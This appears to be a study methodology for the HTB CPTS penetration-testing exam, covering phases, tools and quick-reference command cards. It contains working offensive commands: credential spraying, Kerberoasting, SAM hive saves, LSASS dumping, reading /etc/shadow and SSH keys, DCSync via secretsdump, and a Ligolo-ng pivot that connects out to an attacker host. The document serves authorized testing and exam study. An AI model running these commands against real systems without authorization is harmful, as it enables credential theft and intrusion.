# CPTS BULLETPROOF METHODOLOGY
## Decision-Tree Based, Iterative, Comprehensive

> Covers 100% of CPTS exam (28 HTB Academy modules). Every attack, every scenario, every decision point.
> Phases sequential by default. Real flow is iterative — see "FLOW REALITY" below. After EACH new foothold, RESTART from Phase 1 on new host.

---

## TABLE OF CONTENTS

```
PHASE 0   — Pre-Engagement, Setup, Recon Prep
PHASE 1   — External Recon & Enumeration (Nmap, Footprinting)
PHASE 2   — Web Application Enumeration
PHASE 3   — Web Application Attacks (LFI/RFI, CMDi, SQLi, XSS, Upload, BF, XXE, SSRF, IDOR, Verb/Header, JWT, LDAPi, Mass Assign)
PHASE 4   — Service Attacks (FTP, SMB, MSSQL, MySQL, RDP, WinRM, DNS, SMTP, POP3/IMAP, TFTP, SNMP, Oracle, IPMI, Rsync, R-Services)
PHASE 5   — Password Attacks (cracking — runs in parallel with 7/8/9 once hashes obtained)
PHASE 6   — Shells & Payloads (web shells, reverse/bind, MSFvenom, AV evasion, AMSI bypass)
PHASE 7   — Post-Exploitation Credential Harvesting (Win/Linux)
PHASE 8   — Privilege Escalation (Linux + Windows + Citrix Breakout)
PHASE 9   — Active Directory Attacks (LLMNR → AS-REP → Kerberoast → ACL → DCSync → ADCS → Trusts → Bleeding edge)
PHASE 10  — Pivoting & Tunneling (Ligolo-ng, Chisel, SSH, Sshuttle, Dnscat2, ptunnel-ng, Rpivot, SocksOverRDP)
PHASE 10B — File Transfers
PHASE 11  — Common Applications (CMS, Tomcat, Jenkins, Splunk, PRTG, GitLab, osTicket, ColdFusion, IIS Tilde, Thick Client, LDAP, SCCM/MECM, WSUS, Veeam)
PHASE 12  — Documentation & Reporting

QUICK REFERENCE CARDS    — at top, "first 5 minutes" + post-creds + post-admin + pivot
ITERATIVE METHODOLOGY    — at end, what to do after every foothold
```

## FLOW REALITY (read before exam)

```
Linear order vs real exam:
  Phases 1→2→3 (recon, web) are mostly linear.
  Phases 4→6→7→8→9 are ITERATIVE — each new foothold restarts the loop.
  Phase 5 (cracking) runs in PARALLEL once hashes captured in 7/8/9.
  Phase 10/10B (pivot/transfer) run as needed throughout.
  Phase 12 (notes/screenshots) is CONTINUOUS — start at Phase 0.

Typical exam path:
  Phase 0 → 1 (nmap) → 2 (web enum) → 3 (web attack) → 6 (shell)
  → 7 (creds on host) → 5 (crack if needed) → 8 (privesc) → 9 (AD if joined)
  → 10 (pivot) → restart at 1 for new subnet
```

---

# PHASE 0: PRE-ENGAGEMENT, SETUP & RECON PREP

## 0.0 - Pre-Engagement (CPTS exam has these documents — read them FIRST)

```
Exam scope artifacts:
├── Letter of Engagement → assets in scope, dates, attack window, contact, RoE
├── Scoping Questionnaire → tech stack hints, sensitive systems, exclusions
├── Pre-Engagement Meeting / Kick-off → black/grey/white box, internal/external, evasive Y/N
└── Contractor Agreement / NDA → handling of loot, retention rules

Read scope before scanning. Out-of-scope hit = report fail. Common scope sections:
├── In-scope IP/CIDR + domains + apps
├── Excluded IPs (often DCs from active scanning, prod DBs, third-party SaaS)
├── Allowed techniques (DoS allowed? social engineering? phys?)
├── Testing window (start/end timestamps, business hours only?)
├── Emergency contact (who to call if production breaks)
└── Reporting deliverables (final report, evidence pack, attestation)

PTES stages (mental model for what phase you're in):
  Pre-Engagement → Info Gathering → Threat Modeling → Vuln Analysis
  → Exploitation → Post-Exploitation → Reporting
```

## 0.1 - Tool Checklist (verify all present)
```
which nmap netexec nxc smbclient smbmap rpcclient enum4linux enum4linux-ng \
# Note: crackmapexec (CME) deprecated 2023 → use netexec (nxc). All commands below use netexec.
responder kerbrute bloodhound-python sharphound powerview rubeus mimikatz \
psexec.py wmiexec.py secretsdump.py smbexec.py mssqlclient.py GetNPUsers.py \
ticketer.py ntlmrelayx.py evil-winrm xfreerdp sshuttle chisel socat \
proxychains proxychains4 ssh plink hashcat john ffuf gobuster nikto sqlmap \
msfvenom msfconsole nc ncat python3 \
# Added: AD post-exploit + ADCS + coercion + IPv6 + delegation toolkit
certipy gMSADumper.py mitm6 Coercer.py addcomputer.py rbcd.py getST.py \
ldapdomaindump windapsearch.py kerbrute jwt_tool pypykatz adidnsdump \
gpp-decrypt SharpGPOAbuse PetitPotam.py printerbug.py dfscoerce.py \
# Pivoting / tunneling
ligolo-ng chisel sshuttle proxychains4 socat plink dnscat2 ptunnel-ng \
# Web enum/exploit
wpscan joomscan droopescan whatweb wappalyzer eyewitness aquatone wafw00f feroxbuster \
# Linux/Windows privesc
linpeas.sh winPEASany.exe pspy64 LinEnum.sh Seatbelt.exe PowerUp.ps1 jaws-enum.ps1 \
SeBackupPrivilegeUtils.dll SeBackupPrivilegeCmdLets.dll \
# Token/potato suite
JuicyPotato.exe PrintSpoofer.exe GodPotato.exe \
# Recon helpers
theHarvester crt.sh assetfinder amass subfinder dnsenum dnsrecon fierce dnsx httpx \
# Cracking
hashcat john hashid cewl
```

## 0.2 - 6-Layer Enumeration Methodology
```
1. Internet Presence — domains, subdomains, vHosts, ASN, netblocks, IPs, cloud instances
2. Gateway — firewalls, DMZ, IPS/IDS, EDR, proxies, NAC, VPN, Cloudflare
3. Accessible Services — service type, functionality, config, port, version, interface
4. Processes — PID, processed data, tasks, source, destination
5. Privileges — groups, users, permissions, restrictions, environment
6. OS Setup — OS type, patch level, network config, config files, sensitive files
```

## 0.3 - Injection Type Quick Reference
```
SQL Injection:       ' , ; -- /* */
Command Injection:   ; && | || ` ` $()
LDAP Injection:      * ( ) & |
XPath Injection:     ' or and not substring concat count
Code Injection:      ' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal: ../ ..\ %00
Object Injection:    ; & |
XQuery Injection:    ' ; -- /* */
Shellcode Injection: \x \u %u %n
Header Injection:    \n \r\n \t %0d %0a %09
```

## 0.4 - Web Proxy Setup (Burp Suite / ZAP)
```
1. Start Burp: burpsuite (or ZAP: zaproxy)
2. Configure Firefox proxy: 127.0.0.1:8080
   └── Or use FoxyProxy extension (pre-configured in Kali/Parrot)
3. Install CA certificate:
   ├── Burp: browse to http://burp → download CA cert
   └── ZAP: Tools > Options > Network > Server Certificates → Save
4. Install in Firefox: about:preferences#privacy → View Certificates → Authorities → Import
5. Check "Trust this CA to identify websites"
```

**Burp Suite Key Features:**
```
├── Proxy > Intercept → Toggle on/off (keep OFF for passive browsing, ON for editing)
├── Proxy > HTTP History → Review all requests (filter by host/status/method)
├── Target > Site Map → Application map (right-click → Engagement Tools → Find comments / Find references)
├── Repeater (Ctrl+R) → Modify and resend requests
│   └── Multiple tabs → keep separate per endpoint
├── Intruder (Ctrl+I) → Automated fuzzing/brute force
│   ├── Sniper      → 1 param, 1 wordlist
│   ├── Battering ram → all positions = same payload
│   ├── Pitchfork   → multiple params, parallel wordlists (user+pass pairs)
│   └── Cluster bomb → cross-product (every user × every pass)
├── Decoder → Encode/decode (URL, Base64, HTML, Hex, ASCII hex)
├── Comparer → Diff two responses (Words/Bytes) — KEY for blind SQLi/auth bypass
├── Sequencer → randomness test (session tokens, anti-CSRF)
├── Extender → BApp Store (Logger++, Autorize, JWT Editor, Param Miner)
└── Right-click → Change request method (GET↔POST)
```

**Burp Workflow Patterns (exam-grade):**
```
# Find hidden parameter
1. Capture baseline request → send to Repeater
2. Right-click → "Find references" / Intruder → param wordlist (burp-parameter-names.txt)
3. Compare response length to baseline → outlier = hidden param

# Bypass blacklist filter
1. Send request to Repeater
2. Modify payload variants → resend
3. Use Comparer on response pairs → find which variant slipped through

# Session handling (automatic re-login after token expires)
1. Project options → Sessions → Add → Session Handling Rule
2. Macro: record login flow
3. Scope: Intruder + Repeater
4. Result: stale cookies auto-refreshed mid-attack

# Match-and-replace (auto-add auth header)
1. Proxy → Options → Match and Replace → Add
2. Type: Request header
3. Match: ^User-Agent.*  Replace: Authorization: Bearer <token>
4. Now every request through proxy carries token

# Search across site for secrets / interesting strings
Target → Site map → right-click root → Engagement Tools → Search
Search for: "password", "api_key", "TODO", "BEGIN RSA"

# Logger++ extension (full traffic log + search/filter export)
BApp Store → Logger++ → install
# Then: Logger++ tab → CSV export → grep for creds
```

**Burp Intruder — payload set examples:**
```
# Login brute force (pitchfork mode)
Payload set 1: usernames.txt
Payload set 2: passwords.txt
Grep Match: "Invalid"  (filter out failed)
Grep Extract: <csrf_token regex>  (chain CSRF tokens per request)

# IDOR enumeration (sniper mode)
Position: §id§=1
Payload: Numbers 1-1000
Grep Extract: <email regex>  → bulk dump

# Hidden directory fuzzing (sniper mode — but ffuf usually faster)
Position: /§FUZZ§
Payload: dirbuster wordlist

# Param mining (cluster bomb)
Position: ?§param§=§value§
Payload 1: param wordlist
Payload 2: ['1', 'true', 'admin', 'a"', "a'"]
```

## 0.5 - Workspace Setup
```bash
mkdir -p loot screenshots notes
# Record EVERYTHING: timestamps, commands, output
# Every credential found → save immediately
# Every host compromised → note IP, hostname, user, method
```

## 0.6 - Vulnerability Assessment & CVE Research

### Nessus / OpenVAS (automated scanning)
```bash
# Nessus
# 1. Install: sudo dpkg -i Nessus-*.deb; sudo systemctl start nessusd
# 2. Access: https://localhost:8834
# 3. Create scan → Basic Network Scan → Advanced → enable all plugins
# 4. Credentialed scan (SSH keys or password) → deeper findings
# 5. Export: .nessus, PDF, HTML

# Credentialed scan setup (SSH):
# Credentials → SSH → private key or password
# Credentialed scan setup (Windows):
# Credentials → Windows → LM/NTLM or password

# OpenVAS (free alternative)
sudo gvm-setup; sudo gvm-start
# Access: https://localhost:9392
# Scan → Tasks → New Task → Full and Fast

# Triage scanner output:
# High/Critical RCE → validate manually in Repeater
# Medium → check exploit-db for PoC
# Informational → focus on manual testing
```

### searchsploit / exploit-db / NVD workflow (CRITICAL for every service version)
```bash
# Update local exploit-db mirror (offline-capable)
searchsploit -u

# Search by product + version (drop minor where possible)
searchsploit apache 2.4.49
searchsploit "wordpress 5.7"
searchsploit "tomcat 9"
searchsploit cisco asa

# Mirror exploit code locally (work offline)
searchsploit -m <EDB-ID>
searchsploit -m exploits/linux/remote/47297.py

# Examine before running
searchsploit -x <EDB-ID>
cat ~/.searchsploit/exploits/linux/remote/47297.py | head -50

# Filter out junk (DOS, low quality)
searchsploit apache 2.4 --exclude="(DoS|/dos/)"

# Web → JSON for piping into report
searchsploit --json tomcat 9 | jq

# CVE lookup chain (after Nessus finds something)
# 1. Note CVE-YYYY-NNNN
# 2. NVD: https://nvd.nist.gov/vuln/detail/CVE-YYYY-NNNN
# 3. exploit-db search: https://www.exploit-db.com/search?cve=YYYY-NNNN
# 4. GitHub: https://github.com/search?q=CVE-YYYY-NNNN&type=repositories
# 5. PoCsInGitHub: https://github.com/nomi-sec/PoC-in-GitHub

# Metasploit search
msfconsole -q -x "search cve:YYYY-NNNN; exit"

# Vetting a PoC BEFORE running (mandatory)
# - Read full source, look for backdoors / fake exploit shells
# - Check author rep on GitHub
# - Test on lab box first if uncertain
# - Avoid "click here to crash production" DoS modules unless RoE allows

# Quick service-version research one-liners
nmap -sV -p<port> <target>    # get exact version banner
banner=$(nc -nv <target> <port> | head -1)
searchsploit "$(echo $banner | awk '{print $1, $2}')"

# Snapshot Nessus findings → searchsploit chain
nessus_export.nessus → grep High → for each plugin: searchsploit <product> <version>
```

### Risk Severity (CVSS 3.1 — see Phase 12 for vector breakdown)
```
Critical (9.0-10.0)  → drop everything, validate now
High     (7.0-8.9)   → next 24 hours
Medium   (4.0-6.9)   → next sprint, chain with others
Low      (0.1-3.9)   → harden, don't waste exploit time
```

## 0.7 - Audit Log Credential Harvesting (Linux)
```bash
# If member of adm group → can read TTY audit logs
# Logs contain cleartext passwords typed into su/sudo
aureport --tty                      # List TTY sessions
aureport --tty -i                   # Interactive sessions
# Search for password entries in audit logs
grep -a "password" /var/log/audit/audit.log.* 2>/dev/null
```

---

# QUICK REFERENCE CARDS

> Most-used during exam — flip here before diving into phases.

## CARD 1: FIRST 5 MINUTES (new target)
```bash
# Full TCP port scan
nmap -sT -p- --min-rate=10000 -oA full_tcp <target>

# Service scan on found ports
nmap -sC -sV -p <ports> -oA services <target>

# UDP top ports (always check)
sudo nmap -sU --top-ports=50 -oA udp_top <target>

# Web dir scan (if web found)
gobuster dir -u http://<target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 50

# SMB enum (if 445 open)
smbclient -N -L //<target>
smbmap -H <target>
netexec smb <target> --shares -u '' -p ''
```

## CARD 2: GOT CREDS → SPRAY EVERYWHERE
```bash
netexec smb <range> -u <user> -p '<pass>'
netexec winrm <range> -u <user> -p '<pass>'
netexec mssql <range> -u <user> -p '<pass>'
netexec ssh <range> -u <user> -p '<pass>'
netexec rdp <range> -u <user> -p '<pass>'
netexec ldap <dc> -u <user> -p '<pass>'

# Interactive
evil-winrm -i <target> -u <user> -p '<pass>'
ssh <user>@<target>
xfreerdp /v:<target> /u:<user> /p:'<pass>'

# AD with creds → always run BloodHound
bloodhound-python -u <user> -p '<pass>' -ns <dc_ip> -d <domain> -c All

# AD with creds → always check
GetUserSPNs.py -dc-ip <dc> <domain>/<user> -request    # Kerberoast
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc>  # AS-REP
netexec ldap <dc> -u <user> -p '<pass>' -M laps        # LAPS
python3 gMSADumper.py -u <user> -p '<pass>' -d <domain>  # gMSA
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc> -vulnerable -stdout  # ADCS
```

## CARD 3: GOT ADMIN → DUMP EVERYTHING
```bash
# Windows local — registry hives
reg.exe save hklm\sam C:\Windows\Temp\sam.save
reg.exe save hklm\system C:\Windows\Temp\system.save
reg.exe save hklm\security C:\Windows\Temp\security.save

# Windows remote (local admin)
netexec smb <target> -u <admin> -p '<pass>' --local-auth --sam --lsa

# LSASS dump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full

# Linux
cat /etc/shadow /etc/passwd
find / -name 'id_rsa' 2>/dev/null
grep -rn password /etc /home /var/www 2>/dev/null

# Domain (if DA)
secretsdump.py -just-dc <domain>/<admin>:'<pass>'@<dc_ip>
```

## CARD 4: PIVOT (Ligolo-ng default)
```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot host
./agent -connect <attacker>:11601 -ignore-cert &

# Proxy console
session → select → start
# Attacker
sudo ip route add <internal_subnet> dev ligolo
nmap -sT -Pn <internal_host>
```

---